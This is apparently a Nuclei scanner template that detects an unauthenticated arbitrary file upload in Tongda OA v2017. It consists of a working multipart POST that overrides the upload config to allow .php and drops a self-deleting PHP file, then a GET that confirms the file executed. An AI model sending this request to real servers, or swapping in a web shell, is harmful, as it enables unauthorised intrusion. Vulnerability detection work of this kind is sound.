id: tongdaOA-v2017-action_upload_php-file-upload

info:
  name: 通达OA v2017 action_upload.php 任意文件上传漏洞
  author: cnaq
  severity: critical
  description: 通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
  tags: tongdaOA,api,file,upload
  
requests:
  - raw:
      - |
        POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724
        X_requested_with: XMLHttpRequest
        Accept-Encoding: gzip

        -----------------------------55719851240137822763221368724
        Content-Disposition: form-data; name="CONFIG[fileFieldName]"

        ffff
        -----------------------------55719851240137822763221368724
        Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

        1000000000
        -----------------------------55719851240137822763221368724
        Content-Disposition: form-data; name="CONFIG[filePathFormat]"

        {{randstr}}
        -----------------------------55719851240137822763221368724
        Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

        .php
        -----------------------------55719851240137822763221368724
        Content-Disposition: form-data; name="ffff"; filename="test1.php"
        Content-Type: application/octet-stream

        <?php echo {{randstr}};@unlink ("{{randstr}}.php");?>
        -----------------------------55719851240137822763221368724
        Content-Disposition: form-data; name="mufile"

        submit
        -----------------------------55719851240137822763221368724--
      - |
        GET /{{randstr}}.php HTTP/1.1
        Host: {{Hostname}}

    req-condition: true # dsl跨请求处理需要开启选项
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200&&len(body_1)==0'
          - 'status_code_2 == 200&&contains(body_2, "{{randstr}}")'
        condition: and